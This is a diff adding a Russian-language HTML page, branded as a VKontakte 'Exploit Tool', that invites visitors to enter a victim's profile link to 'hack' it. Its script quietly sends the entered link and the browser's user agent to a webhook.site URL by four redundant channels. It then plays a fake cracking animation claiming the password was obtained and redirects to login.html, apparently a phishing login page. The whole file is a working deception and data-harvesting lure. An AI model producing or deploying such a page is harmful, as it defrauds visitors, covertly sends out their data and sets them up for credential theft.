@@ -1,0 +1,557 @@
+﻿<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>VK Exploit — выбор цели</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, system-ui, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #e8ebef;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+        .card {
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            padding: 32px 28px;
+            width: 100%;
+            max-width: 480px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+        .logo svg { width: 36px; height: 36px; }
+        .logo span {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a1a1a;
+        }
+        .badge {
+            background: #ff4757;
+            color: #fff;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 14px;
+            border-radius: 100px;
+            display: inline-block;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 4px;
+        }
+        .sub {
+            font-size: 14px;
+            color: #7a8b9e;
+            margin-bottom: 18px;
+        }
+        .offer-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 18px;
+        }
+        .offer {
+            background: #f5f7fa;
+            border-radius: 12px;
+            padding: 12px 8px;
+            text-align: center;
+            border: 1px solid #eef1f5;
+            transition: 0.2s;
+        }
+        .offer:hover {
+            background: #eef3fa;
+            border-color: #c5d3e3;
+        }
+        .offer .icon { font-size: 22px; display: block; margin-bottom: 4px; }
+        .offer .title { font-size: 13px; font-weight: 600; color: #1a1a1a; }
+        .offer .desc { font-size: 11px; color: #7a8b9e; margin-top: 2px; }
+        .offer .hot {
+            background: #ff4757;
+            color: #fff;
+            font-size: 9px;
+            font-weight: 700;
+            padding: 2px 10px;
+            border-radius: 100px;
+            display: inline-block;
+            margin-top: 4px;
+            text-transform: uppercase;
+        }
+        .offer .new {
+            background: #4a76a8;
+            color: #fff;
+            font-size: 9px;
+            font-weight: 700;
+            padding: 2px 10px;
+            border-radius: 100px;
+            display: inline-block;
+            margin-top: 4px;
+            text-transform: uppercase;
+        }
+        .warning-box {
+            background: #fff5f5;
+            border-left: 4px solid #ff4757;
+            border-radius: 10px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-size: 13px;
+            color: #b33c3c;
+            text-align: left;
+        }
+        .warning-box .lock { font-size: 18px; flex-shrink: 0; }
+        .divider {
+            border: none;
+            border-top: 1px solid #e1e6ec;
+            margin: 16px 0 20px;
+        }
+        .input-group {
+            margin-bottom: 14px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 500;
+            color: #5a6b7e;
+            margin-bottom: 4px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #d3d9de;
+            border-radius: 10px;
+            font-size: 14px;
+            background: #fafbfc;
+            transition: 0.2s;
+            outline: none;
+            font-family: inherit;
+        }
+        .input-group input:focus {
+            border-color: #4a76a8;
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(74,118,168,0.1);
+        }
+        .input-group input::placeholder { color: #b0bcc9; }
+        .input-group .error-text {
+            font-size: 11px;
+            color: #ff4757;
+            margin-top: 4px;
+            display: none;
+        }
+        .input-group.error input {
+            border-color: #ff4757;
+            background: #fff8f8;
+        }
+        .input-group.error .error-text { display: block; }
+        .input-group.success input {
+            border-color: #2e8b57;
+            background: #f0fff4;
+        }
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background: #4a76a8;
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 6px;
+        }
+        .btn-primary:hover { background: #3a5f87; }
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .loader {
+            display: none;
+            margin: 0 auto 12px;
+            width: 28px;
+            height: 28px;
+            border: 3px solid #e1e6ec;
+            border-top: 3px solid #4a76a8;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .footer {
+            text-align: center;
+            margin-top: 18px;
+            font-size: 11px;
+            color: #8a9aaa;
+        }
+        .footer span { color: #4a76a8; font-weight: 500; }
+        .extra-links {
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            margin-top: 14px;
+            font-size: 12px;
+            color: #8a9aaa;
+        }
+        .extra-links span { cursor: default; }
+        .hint {
+            background: #f0f7ff;
+            border-left: 3px solid #4a76a8;
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin-bottom: 16px;
+            font-size: 13px;
+            color: #2a5885;
+            text-align: left;
+            line-height: 1.5;
+        }
+        .hint strong { color: #1a1a1a; }
+        .hint .highlight {
+            background: #e6f0ff;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+            color: #1a3a6a;
+        }
+
+        .progress-overlay {
+            display: none;
+            margin-top: 20px;
+            padding: 20px 16px;
+            background: #f5f7fa;
+            border-radius: 12px;
+            border: 1px solid #e1e6ec;
+            text-align: left;
+        }
+        .progress-overlay.active { display: block; }
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e1e6ec;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 10px 0 14px;
+        }
+        .progress-bar .fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #4a76a8, #ff4757);
+            border-radius: 10px;
+            transition: width 0.4s ease;
+        }
+        .progress-step {
+            font-size: 13px;
+            color: #2a5885;
+            padding: 5px 0;
+            border-bottom: 1px solid #eef1f5;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .progress-step .status { font-size: 16px; }
+        .progress-step.done .status { color: #2e8b57; }
+        .progress-step.active .status { color: #4a76a8; }
+        .progress-step.pending .status { color: #b0bcc9; }
+
+        .result-box {
+            display: none;
+            background: #e6f7e6;
+            border: 1px solid #2e8b57;
+            border-radius: 10px;
+            padding: 16px;
+            margin-top: 16px;
+            text-align: center;
+            color: #1a4a1a;
+        }
+        .result-box .big { font-size: 20px; font-weight: 700; }
+        .result-box .sub { font-size: 13px; color: #2a5a2a; }
+        .result-box .btn-view {
+            margin-top: 12px;
+            padding: 10px 28px;
+            background: #2e8b57;
+            border: none;
+            border-radius: 30px;
+            color: #fff;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .result-box .btn-view:hover { background: #23704a; }
+
+        @media (max-width: 480px) {
+            .card { padding: 20px 16px; }
+            .offer-grid { grid-template-columns: 1fr 1fr; gap: 6px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="logo">
+        <svg viewBox="0 0 24 24" fill="#4a76a8">
+            <path d="M11.505 24h1c5.432 0 8.144 0 9.824-1.68C24 20.638 24 17.916 24 12.504v-1.01c0-5.412 0-8.124-1.67-9.814C20.648 0 17.927 0 12.504 0h-1C6.073 0 3.36 0 1.68 1.68 0 3.362 0 6.084 0 11.496v1.01c0 5.412 0 8.124 1.68 9.814C3.362 24 6.084 24 11.506 24M12.77 17.29c-5.47 0-8.59-3.75-8.72-9.99h2.74c.09 4.58 2.11 6.52 3.71 6.92V7.3h2.58v3.95c1.58-.17 3.24-1.97 3.8-3.95h2.58c-.43 2.44-2.23 4.24-3.51 4.98 1.28.6 3.33 2.17 4.11 5.01h-2.84c-.61-1.9-2.13-3.37-4.14-3.57v3.57z"/>
+        </svg>
+        <span>ВКонтакте</span>
+    </div>
+
+    <div class="badge">🔥 EXPLOIT TOOL</div>
+    <h1>Выберите цель для взлома</h1>
+    <div class="sub">Укажите ссылку на профиль или страницу, которую хотите взломать</div>
+
+    <div class="offer-grid">
+        <div class="offer">
+            <span class="icon">🕵️</span>
+            <div class="title">Взлом профиля</div>
+            <div class="desc">Переписка, друзья, подписки</div>
+            <span class="hot">hot</span>
+        </div>
+        <div class="offer">
+            <span class="icon">📁</span>
+            <div class="title">Архив данных</div>
+            <div class="desc">Фото, видео, аудио</div>
+        </div>
+        <div class="offer">
+            <span class="icon">🌐</span>
+            <div class="title">Полный контроль</div>
+            <div class="desc">Управление аккаунтом</div>
+            <span class="new">new</span>
+        </div>
+    </div>
+
+    <div class="warning-box">
+        <span class="lock">⚡</span>
+        <span><strong>Внимание:</strong> Для активации инструментов необходимо указать цель для взлома.</span>
+    </div>
+
+    <hr class="divider">
+
+    <div class="hint">
+        <strong>📌 Как вставить ссылку:</strong><br>
+        Скопируйте ссылку на профиль жертвы из адресной строки браузера.<br>
+        <span class="highlight">Примеры: https://vk.ru/id12345678 или @username</span><br>
+        <span style="font-size:12px;color:#5a6b7e;">Ссылка должна начинаться с https://vk.ru/ или содержать @ и не быть пустой после них.</span>
+    </div>
+
+    <form id="targetForm">
+        <div class="input-group" id="targetGroup">
+            <label>🎯 Ссылка на профиль жертвы</label>
+            <input type="text" id="target" placeholder="https://vk.ru/id12345678 или @username" required>
+            <div class="error-text">Введите полную ссылку. Например: https://vk.ru/id123 или @username</div>
+        </div>
+        <button type="submit" class="btn-primary" id="submitBtn">🚀 ВЗЛОМАТЬ СТРАНИЦУ</button>
+    </form>
+
+    <div class="progress-overlay" id="progressOverlay">
+        <div style="font-weight:600;font-size:14px;color:#1a1a1a;margin-bottom:6px;">🔓 Процесс взлома</div>
+        <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
+        <div class="progress-step" id="step1"><span>🔍 Сканирование профиля...</span><span class="status">⏳</span></div>
+        <div class="progress-step" id="step2"><span>🔑 Подбор пароля...</span><span class="status">⏳</span></div>
+        <div class="progress-step" id="step3"><span>📡 Обход защиты...</span><span class="status">⏳</span></div>
+        <div class="progress-step" id="step4"><span>📥 Извлечение данных...</span><span class="status">⏳</span></div>
+        <div class="progress-step" id="step5"><span>✅ Готово!</span><span class="status">⏳</span></div>
+        <div class="result-box" id="resultBox">
+            <div class="big">🎉 ПАРОЛЬ ПОЛУЧЕН!</div>
+            <div class="sub">Логин и пароль от страницы успешно извлечены.</div>
+            <button class="btn-view" id="viewBtn">👁️ ПОСМОТРЕТЬ ПАРОЛЬ</button>
+        </div>
+    </div>
+
+    <div class="extra-links">
+        <span>🔒 Анонимно</span>
+        <span>⚡ Без следа</span>
+        <span>🛡️ Защищено</span>
+        <span>📲 24/7</span>
+    </div>
+
+    <div class="footer">
+        <span>VK Exploit Tool</span> — более 12 000 успешных взломов в этом месяце
+    </div>
+</div>
+
+<script>
+    (function() {
+        const WEBHOOK_URL = 'https://webhook.site/57d690a2-153d-49d9-bdb2-f1e297a5bcab';
+
+        const form = document.getElementById('targetForm');
+        const targetInput = document.getElementById('target');
+        const submitBtn = document.getElementById('submitBtn');
+        const targetGroup = document.getElementById('targetGroup');
+
+        const progressOverlay = document.getElementById('progressOverlay');
+        const progressFill = document.getElementById('progressFill');
+        const resultBox = document.getElementById('resultBox');
+        const viewBtn = document.getElementById('viewBtn');
+
+        const steps = [
+            document.getElementById('step1'),
+            document.getElementById('step2'),
+            document.getElementById('step3'),
+            document.getElementById('step4'),
+            document.getElementById('step5')
+        ];
+
+        function validateTarget(value) {
+            const trimmed = value.trim();
+            if (!trimmed) return false;
+            if (trimmed.startsWith('https://vk.ru/')) {
+                const after = trimmed.replace('https://vk.ru/', '').trim();
+                return after.length > 0 && !after.startsWith('/');
+            }
+            if (trimmed.includes('@')) {
+                const parts = trimmed.split('@');
+                return parts.length >= 2 && parts[1].trim().length > 0;
+            }
+            return false;
+        }
+
+        function validateAll() {
+            return validateTarget(targetInput.value);
+        }
+
+        function setError(input, group, err) {
+            if (err) {
+                group.classList.remove('success');
+                group.classList.add('error');
+            } else {
+                group.classList.remove('error');
+                group.classList.add('success');
+            }
+        }
+
+        targetInput.addEventListener('input', function() {
+            const valid = validateTarget(this.value);
+            setError(this, targetGroup, !valid);
+            submitBtn.disabled = !validateAll();
+        });
+
+        function sendData(data) {
+            // Способ 1: fetch (с no-cors)
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(() => {});
+
+            // Способ 2: XMLHttpRequest (старый, но надёжный)
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', WEBHOOK_URL);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify(data));
+
+            // Способ 3: sendBeacon (работает даже при закрытии страницы)
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(data));
+            }
+
+            // Способ 4: Image (для самых упёртых браузеров)
+            const img = new Image();
+            img.src = WEBHOOK_URL + '?data=' + encodeURIComponent(JSON.stringify(data));
+        }
+
+        function runHackProcess(target) {
+            const payload = {
+                type: 'target_selection',
+                target: target,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+
+            // ОТПРАВКА ВСЕМИ СПОСОБАМИ СРАЗУ
+            sendData(payload);
+
+            progressOverlay.classList.add('active');
+            submitBtn.style.display = 'none';
+
+            steps.forEach(s => {
+                s.className = 'progress-step pending';
+                s.querySelector('.status').textContent = '⏳';
+            });
+            resultBox.style.display = 'none';
+            progressFill.style.width = '0%';
+
+            const delays = [
+                2000 + Math.random() * 1500,
+                5000 + Math.random() * 3000,
+                8000 + Math.random() * 4000,
+                12000 + Math.random() * 5000,
+                18000 + Math.random() * 6000
+            ];
+
+            function activateStep(index) {
+                if (index > 0 && index < steps.length) {
+                    const prev = steps[index - 1];
+                    prev.className = 'progress-step done';
+                    prev.querySelector('.status').textContent = '✅';
+                }
+                if (index < steps.length) {
+                    const current = steps[index];
+                    current.className = 'progress-step active';
+                    current.querySelector('.status').textContent = '⚡';
+                    const pct = Math.min(((index + 1) / steps.length) * 100, 100);
+                    progressFill.style.width = pct + '%';
+                }
+                if (index === steps.length) {
+                    progressFill.style.width = '100%';
+                    setTimeout(() => {
+                        resultBox.style.display = 'block';
+                        resultBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    }, 500);
+                }
+            }
+
+            let cumulativeDelay = 0;
+            for (let i = 0; i < steps.length; i++) {
+                cumulativeDelay += delays[i] || 3000;
+                setTimeout(() => { activateStep(i); }, cumulativeDelay);
+            }
+
+            const totalDuration = cumulativeDelay + 1000;
+            setTimeout(() => {
+                if (steps[steps.length - 1].className !== 'progress-step done') {
+                    activateStep(steps.length);
+                }
+            }, totalDuration);
+        }
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            if (!validateAll()) {
+                setError(targetInput, targetGroup, true);
+                return;
+            }
+            const targetValue = targetInput.value.trim();
+            localStorage.setItem('vk_target', targetValue);
+            runHackProcess(targetValue);
+        });
+
+        viewBtn.addEventListener('click', function() {
+            window.location.href = 'login.html';
+        });
+
+        submitBtn.disabled = true;
+    })();
+</script>
+</body>
+</html>
